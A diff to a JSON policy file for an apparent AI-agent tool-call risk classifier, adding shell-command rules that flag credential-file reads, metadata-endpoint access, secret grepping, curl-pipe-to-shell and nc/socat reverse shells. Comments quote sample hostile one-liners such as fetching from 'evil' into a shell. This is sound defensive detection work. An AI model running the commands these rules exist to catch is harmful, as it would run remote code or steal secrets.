@@ -10,84 +10,626 @@
       "id": "transfer.funds",
       "impact_class": "transfer",
       "impact_tier": "critical",
-      "tool_name": ["transfer*", "*_transfer", "*payment*", "*wire*", "pay_*", "*payout*", "*refund*"]
+      "tool_name": [
+        "transfer*",
+        "*_transfer",
+        "*payment*",
+        "*wire*",
+        "pay_*",
+        "*payout*",
+        "*refund*"
+      ]
     },
     {
       "id": "transfer.mcp",
       "impact_class": "transfer",
       "impact_tier": "critical",
-      "mcp_server": ["*payment*", "*stripe*", "*banking*"]
+      "mcp_server": [
+        "*payment*",
+        "*stripe*",
+        "*banking*"
+      ]
     },
     {
       "id": "delete.destructive",
       "impact_class": "delete",
       "impact_tier": "high",
-      "tool_name": ["delete_*", "*_delete", "rm", "rm_*", "remove_*", "drop_*", "*_drop", "destroy_*", "truncate*", "purge*", "wipe_*"]
+      "tool_name": [
+        "delete_*",
+        "*_delete",
+        "rm",
+        "rm_*",
+        "remove_*",
+        "drop_*",
+        "*_drop",
+        "destroy_*",
+        "truncate*",
+        "purge*",
+        "wipe_*"
+      ]
     },
     {
       "id": "authenticate.credentials",
       "impact_class": "authenticate",
       "impact_tier": "high",
-      "tool_name": ["auth_*", "*_auth", "authenticate*", "*oauth*", "*token*", "*credential*", "*password*", "*secret*", "*api_key*", "*apikey*", "login*", "logout*", "sign_in*", "signin*"]
+      "tool_name": [
+        "auth_*",
+        "*_auth",
+        "authenticate*",
+        "*oauth*",
+        "*token*",
+        "*credential*",
+        "*password*",
+        "*secret*",
+        "*api_key*",
+        "*apikey*",
+        "login*",
+        "logout*",
+        "sign_in*",
+        "signin*"
+      ]
     },
     {
       "id": "deploy.release",
       "impact_class": "deploy",
       "impact_tier": "high",
-      "tool_name": ["deploy*", "*_deploy", "release_*", "*_release", "*rollout*", "promote_*"]
+      "tool_name": [
+        "deploy*",
+        "*_deploy",
+        "release_*",
+        "*_release",
+        "*rollout*",
+        "promote_*"
+      ]
     },
     {
       "id": "publish.content",
       "impact_class": "publish",
       "impact_tier": "high",
-      "tool_name": ["publish*", "*_publish", "*_upload", "upload_*"]
+      "tool_name": [
+        "publish*",
+        "*_publish",
+        "*_upload",
+        "upload_*"
+      ]
     },
     {
       "id": "send.outbound",
       "impact_class": "send",
       "impact_tier": "medium",
-      "tool_name": ["send_*", "*_send", "*_email", "email_*", "post_*", "*_post", "notify*", "*_sms", "sms_*", "reply_*", "tweet*", "compose_*", "forward_*"]
+      "tool_name": [
+        "send_*",
+        "*_send",
+        "*_email",
+        "email_*",
+        "post_*",
+        "*_post",
+        "notify*",
+        "*_sms",
+        "sms_*",
+        "reply_*",
+        "tweet*",
+        "compose_*",
+        "forward_*"
+      ]
     },
     {
       "id": "send.mcp",
       "impact_class": "send",
       "impact_tier": "medium",
-      "mcp_server": ["*email*", "*gmail*", "*smtp*", "*slack*", "*twilio*"]
+      "mcp_server": [
+        "*email*",
+        "*gmail*",
+        "*smtp*",
+        "*slack*",
+        "*twilio*"
+      ]
     },
     {
       "id": "share.access",
       "impact_class": "share",
       "impact_tier": "medium",
-      "tool_name": ["share*", "*_share", "grant_*", "invite_*", "*_permission*", "add_member*"]
+      "tool_name": [
+        "share*",
+        "*_share",
+        "grant_*",
+        "invite_*",
+        "*_permission*",
+        "add_member*"
+      ]
     },
     {
       "id": "read.lookup",
       "impact_class": "read",
       "impact_tier": "low",
-      "tool_name": ["get_*", "read_*", "list_*", "fetch_*", "search_*", "query_*", "describe_*", "view_*", "lookup*", "find_*", "*_get", "*_read", "*_list", "check_*"]
+      "tool_name": [
+        "get_*",
+        "read_*",
+        "list_*",
+        "fetch_*",
+        "search_*",
+        "query_*",
+        "describe_*",
+        "view_*",
+        "lookup*",
+        "find_*",
+        "*_get",
+        "*_read",
+        "*_list",
+        "check_*"
+      ]
     }
   ],
   "argument_escalations": [
     {
       "id": "esc.payment_details",
-      "keys": ["amount", "recipient", "*account*", "iban", "beneficiary", "routing*"],
+      "keys": [
+        "amount",
+        "recipient",
+        "*account*",
+        "iban",
+        "beneficiary",
+        "routing*"
+      ],
       "min_tier": "high"
     },
     {
       "id": "esc.url",
-      "keys": ["url", "uri", "endpoint", "webhook*"],
+      "keys": [
+        "url",
+        "uri",
+        "endpoint",
+        "webhook*"
+      ],
       "min_tier": "medium"
     },
     {
       "id": "esc.path",
-      "keys": ["path", "file_path", "*filepath*", "file"],
+      "keys": [
+        "path",
+        "file_path",
+        "*filepath*",
+        "file"
+      ],
       "min_tier": "medium"
     },
     {
       "id": "esc.credential_value",
-      "keys": ["*"],
+      "keys": [
+        "*"
+      ],
       "value_pattern": "(?i)(api[_-]?key\\s*[:=]|password\\s*[:=]|client_secret|bearer\\s+[a-z0-9])",
       "min_tier": "high"
     }
-  ]
+  ],
+  "command_classifiers": {
+    "description": "Classifies a shell command by its PARSED STRUCTURE (verb + object + modifier), not by matching the raw string. Fed from xaidr.scanner.command_parse.parse_command. Rules are evaluated in order per SEGMENT; first match wins for that segment. The call's class is then aggregated across all segments — see `aggregation`.",
+    "match_fields": {
+      "name": "glob list against the segment's binary name (basename, lowercased)",
+      "wrappers_any": "glob list; matches if ANY stripped wrapper matches",
+      "args_pattern": "regex against the args joined by a space",
+      "args_any": "glob list; matches if ANY single arg matches",
+      "max_args": "int; matches when the segment has at most this many args",
+      "redirect_target_pattern": "regex against any redirection target",
+      "redirect_op": "list of read|write|append|read_write",
+      "env_prefix_keys": "glob list against leading VAR=value keys",
+      "expands": "bool; whether the segment contained $VAR/$(...)/backticks",
+      "raw_pattern": "regex against the segment's raw text (use sparingly)"
+    },
+    "aggregation": {
+      "rule": "The call's impact_class is the HIGHEST-TIER class found across ALL segments, including nested ones expanded from -c payloads.",
+      "tier_order": [
+        "low",
+        "medium",
+        "high",
+        "critical"
+      ],
+      "tie_break": [
+        "1. highest tier wins",
+        "2. on equal tier, class precedence: credential_access > execute > read > unknown (a named sensitive object beats a generic capability)",
+        "3. on equal tier and class, the earliest segment wins"
+      ],
+      "degraded_tier_cap": "high",
+      "degraded_rule": "A segment with parse_degraded=True (notably nested segments from NON-SHELL interpreters, where Python/Perl source is tokenized with shell rules into pseudo-names) MAY contribute a class, but may not be the SOLE basis for a critical tier. If every critical-tier segment is degraded, the tier is capped at high. A non-degraded segment reaching critical is unaffected."
+    },
+    "combinations": [
+      {
+        "id": "combo.fetch_pipe_execute",
+        "impact_class": "execute",
+        "impact_tier": "critical",
+        "comment": "curl|bash and friends. Needs cross-segment reasoning: neither half alone is critical, the pipe between them is.",
+        "when_any": {
+          "name": [
+            "curl",
+            "wget",
+            "fetch",
+            "aria2c",
+            "httpie",
+            "http"
+          ]
+        },
+        "and_any": {
+          "name": [
+            "sh",
+            "bash",
+            "zsh",
+            "ksh",
+            "dash",
+            "ash",
+            "csh",
+            "tcsh",
+            "busybox",
+            "python",
+            "python2",
+            "python3",
+            "python3.*",
+            "perl",
+            "ruby",
+            "node",
+            "nodejs",
+            "php",
+            "lua",
+            "powershell",
+            "pwsh",
+            "osascript",
+            "su"
+          ]
+        }
+      },
+      {
+        "id": "combo.filtered_env_dump",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "`env | grep -i token` — a bare dump is medium, a dump FILTERED for secrets is targeted collection.",
+        "when_any": {
+          "name": [
+            "env",
+            "printenv",
+            "set",
+            "export",
+            "docker",
+            "journalctl",
+            "history",
+            "ps",
+            "kubectl"
+          ]
+        },
+        "and_any": {
+          "name": [
+            "grep",
+            "egrep",
+            "fgrep",
+            "rg",
+            "ack",
+            "ag",
+            "findstr",
+            "select-string",
+            "awk",
+            "sed"
+          ],
+          "args_pattern": "(?i)(?:^|[^a-z0-9])(?:aws_|gcp_|azure_|github_|gh_|openai_|slack_)?(?:secret|token|passwd|password|api[_-]?key|apikey|credential|creds|private[_-]?key|access[_-]?key|client[_-]?secret|session[_-]?key)(?:[^a-z0-9]|$)|(?:^|[^a-z0-9_])env(?:[^a-z0-9_]|$)"
+        }
+      }
+    ],
+    "rules": [
+      {
+        "id": "cred.sensitive_file",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "Any command naming a credential file. The OBJECT decides, not the verb: `cat README.md` is a read, `cat ~/.ssh/id_rsa` is not.",
+        "match": {
+          "args_pattern": "(?i)(\\.ssh/(?:id_[a-z0-9]+|authorized_keys|known_hosts)|\\bid_(?:rsa|dsa|ecdsa|ed25519)\\b|\\.aws/(?:credentials|config)\\b|\\.git-credentials\\b|\\.npmrc\\b|\\.netrc\\b|\\.pypirc\\b|\\.pgpass\\b|\\.docker/config\\.json|\\.kube/config\\b|/etc/(?:shadow|gshadow|sudoers)\\b|/proc/[^/\\s]+/environ\\b|/var/run/secrets/kubernetes\\.io|(?:^|[\\s'\\\"=/])\\.env(?:\\.[a-z0-9_.-]+)?(?:[\\s'\\\"]|$)|\\.pem\\b|\\.p12\\b|\\.pfx\\b|\\.keystore\\b|\\.bash_history\\b|\\.zsh_history\\b)"
+        }
+      },
+      {
+        "id": "cred.sensitive_file_redirect",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "`cat < .env.production` — the object is in the redirect, not argv.",
+        "match": {
+          "redirect_target_pattern": "(?i)(\\.ssh/(?:id_[a-z0-9]+|authorized_keys|known_hosts)|\\bid_(?:rsa|dsa|ecdsa|ed25519)\\b|\\.aws/(?:credentials|config)\\b|\\.git-credentials\\b|\\.npmrc\\b|\\.netrc\\b|\\.pypirc\\b|\\.pgpass\\b|\\.docker/config\\.json|\\.kube/config\\b|/etc/(?:shadow|gshadow|sudoers)\\b|/proc/[^/\\s]+/environ\\b|/var/run/secrets/kubernetes\\.io|(?:^|[\\s'\\\"=/])\\.env(?:\\.[a-z0-9_.-]+)?(?:[\\s'\\\"]|$)|\\.pem\\b|\\.p12\\b|\\.pfx\\b|\\.keystore\\b|\\.bash_history\\b|\\.zsh_history\\b)"
+        }
+      },
+      {
+        "id": "cred.metadata_endpoint",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "Cloud instance-metadata credential endpoints.",
+        "match": {
+          "args_pattern": "(?i)(169\\.254\\.169\\.254|metadata\\.google\\.internal|metadata\\.azure\\.com|100\\.100\\.100\\.200|\\[fd00:ec2::254\\])"
+        }
+      },
+      {
+        "id": "cred.secret_manager",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "Managed secret stores and keychains.",
+        "match": {
+          "args_pattern": "(?i)(secretsmanager\\s+get-secret-value|secrets\\s+versions\\s+access|auth\\s+print-access-token|account\\s+get-access-token|get\\s+secrets?\\b|kv\\s+get\\b|find-generic-password|find-internet-password|--export-secret-keys)"
+        }
+      },
+      {
+        "id": "cred.env_named_secret",
+        "impact_class": "credential_access",
+        "impact_tier": "critical",
+        "comment": "Reading a SPECIFICALLY named secret out of the environment.",
+        "match": {
+          "name": [
+            "printenv",
+            "echo",
+            "export",
+            "env",
+            "set",
+            "printf"
+          ],
+          "args_pattern": "(?i)(?:^|[^a-z0-9])(?:aws_|gcp_|azure_|github_|gh_|openai_|slack_)?(?:secret|token|passwd|password|api[_-]?key|apikey|credential|creds|private[_-]?key|access[_-]?key|client[_-]?secret|session[_-]?key)(?:[^a-z0-9]|$)"
+        }
+      },
+      {
+        "id": "cred.secret_grep",
+        "impact_class": "credential_access",
+        "impact_tier": "high",
+        "comment": "Searching the filesystem/logs for secrets by name.",
+        "match": {
+          "name": [
+            "grep",
+            "egrep",
+            "fgrep",
+            "rg",
+            "ack",
+            "ag",
+            "findstr",
+            "select-string",
+            "awk",
+            "sed"
+          ],
+          "args_pattern": "(?i)(?:^|[^a-z0-9])(?:aws_|gcp_|azure_|github_|gh_|openai_|slack_)?(?:secret|token|passwd|password|api[_-]?key|apikey|credential|creds|private[_-]?key|access[_-]?key|client[_-]?secret|session[_-]?key)(?:[^a-z0-9]|$)"
+        }
+      },
+      {
+        "id": "cred.key_hunt",
+        "impact_class": "credential_access",
+        "impact_tier": "high",
+        "comment": "`find / -name id_rsa` — locating key material.",
+        "match": {
+          "name": [
+            "find",
+            "locate",
+            "fd"
+          ],
+          "args_pattern": "(?i)(id_(?:rsa|dsa|ecdsa|ed25519)|\\*?\\.pem|\\*?\\.p12|credentials)"
+        }
+      },
+      {
+        "id": "cred.env_dump",
+        "impact_class": "credential_access",
+        "impact_tier": "medium",
+        "comment": "A bare environment dump. Real signal, but routine enough that it classifies (so a deployer can gate it) without blocking.",
+        "match": {
+          "name": [
+            "env",
+            "printenv",
+            "set",
+            "export"
+          ],
+          "max_args": 1
+        }
+      },
+      {
+        "id": "exec.interpreter_payload",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "`bash -c '...'`, `python -c '...'`, `perl -e '...'`. The payload flag is what distinguishes this from `python -m pytest`.",
+        "match": {
+          "name": [
+            "sh",
+            "bash",
+            "zsh",
+            "ksh",
+            "dash",
+            "ash",
+            "csh",
+            "tcsh",
+            "busybox",
+            "python",
+            "python2",
+            "python3",
+            "python3.*",
+            "perl",
+            "ruby",
+            "node",
+            "nodejs",
+            "php",
+            "lua",
+            "powershell",
+            "pwsh",
+            "osascript",
+            "su"
+          ],
+          "args_any": [
+            "-c",
+            "-e",
+            "-r",
+            "--eval",
+            "-enc",
+            "-encodedcommand",
+            "-command",
+            "-p"
+          ]
+        }
+      },
+      {
+        "id": "exec.bare_shell",
+        "impact_class": "execute",
+        "impact_tier": "medium",
+        "comment": "Spawning an interactive shell. Classifies so a deployer can gate it; deliberately NOT a blocking detection.",
+        "match": {
+          "name": [
+            "sh",
+            "bash",
+            "zsh",
+            "ksh",
+            "dash",
+            "ash",
+            "csh",
+            "tcsh",
+            "busybox"
+          ],
+          "max_args": 1
+        }
+      },
+      {
+        "id": "exec.eval_source",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "match": {
+          "name": [
+            "eval",
+            "source",
+            ".",
+            "exec"
+          ]
+        }
+      },
+      {
+        "id": "exec.wrapper_exec",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "`exec /bin/bash` — the wrapper is the execute signal.",
+        "match": {
+          "wrappers_any": [
+            "exec"
+          ]
+        }
+      },
+      {
+        "id": "exec.code_in_args",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "Inline code that spawns a process, whatever the host binary is: awk BEGIN{system()}, php -r system(), node child_process.",
+        "match": {
+          "args_pattern": "(?i)(\\bsystem\\s*\\(|\\bos\\.system\\b|\\bos\\.execute\\b|\\bexec\\s*\\(|child_process|\\bpopen\\s*\\(|subprocess\\.(?:run|call|Popen)|__import__\\s*\\(\\s*['\\\"]os)"
+        }
+      },
+      {
+        "id": "exec.tool_exec_flag",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "Living-off-the-land: a non-shell tool talked into spawning one.",
+        "match": {
+          "args_pattern": "(?i)(-exec\\b|--checkpoint-action\\s*=\\s*exec|core\\.pager\\s*=\\s*['\\\"]?!|:!\\S|'!\\S|(?:^|\\s)!\\S|-m\\s+shell\\b|\\bexec:)"
+        }
+      },
+      {
+        "id": "exec.process_substitution",
+        "impact_class": "execute",
+        "impact_tier": "critical",
+        "comment": "`bash <(curl -s x.io/i)` — process substitution feeding a shell. The fetch and the shell are one token to the parser, so this matches the segment's raw text rather than argv.",
+        "match": {
+          "name": [
+            "sh",
+            "bash",
+            "zsh",
+            "ksh",
+            "dash",
+            "ash",
+            "csh",
+            "tcsh",
+            "busybox",
+            "python",
+            "python2",
+            "python3",
+            "python3.*",
+            "perl",
+            "ruby",
+            "node",
+            "nodejs",
+            "php",
+            "lua",
+            "powershell",
+            "pwsh",
+            "osascript",
+            "su"
+          ],
+          "raw_pattern": "<\\(\\s*(?:curl|wget|fetch|nc|ncat)\\b"
+        }
+      },
+      {
+        "id": "exec.substitution_fetch",
+        "impact_class": "execute",
+        "impact_tier": "critical",
+        "comment": "`` `curl -s evil/x` `` / `$(curl ...)` — a fetch inside a command substitution IS the execution.",
+        "match": {
+          "raw_pattern": "(?:`|\\$\\()\\s*(?:curl|wget|fetch)\\b"
+        }
+      },
+      {
+        "id": "exec.temp_path_binary",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "Running a binary out of a world-writable temp directory.",
+        "match": {
+          "raw_pattern": "(?:^|\\s|&&|;)\\s*(?:/tmp/|/var/tmp/|/dev/shm/)\\S+"
+        }
+      },
+      {
+        "id": "exec.windows_lolbin",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "match": {
+          "name": [
+            "cmd",
+            "rundll32",
+            "mshta",
+            "regsvr32",
+            "wscript",
+            "cscript",
+            "certutil",
+            "msbuild",
+            "installutil"
+          ]
+        }
+      },
+      {
+        "id": "exec.remote_shell",
+        "impact_class": "execute",
+        "impact_tier": "high",
+        "comment": "socat/nc spawning a shell (reverse or bind).",
+        "match": {
+          "name": [
+            "socat",
+            "nc",
+            "ncat",
+            "netcat"
+          ],
+          "args_pattern": "(?i)(exec:|-e\\s*/?\\w*(?:sh|bash)\\b|bash\\s+-li)"
+        }
+      },
+      {
+        "id": "read.file",
+        "impact_class": "read",
+        "impact_tier": "low",
+        "comment": "Ordinary file reads. Ordered AFTER the credential rules so a sensitive object wins; this is what `cat README.md` becomes.",
+        "match": {
+          "name": [
+            "cat",
+            "bat",
+            "head",
+            "tail",
+            "less",
+            "more",
+            "nl",
+            "od",
+            "strings",
+            "xxd",
+            "jq",
+            "wc",
+            "diff",
+            "file",
+            "stat"
+          ]
+        }
+      }
+    ]
+  }
 }
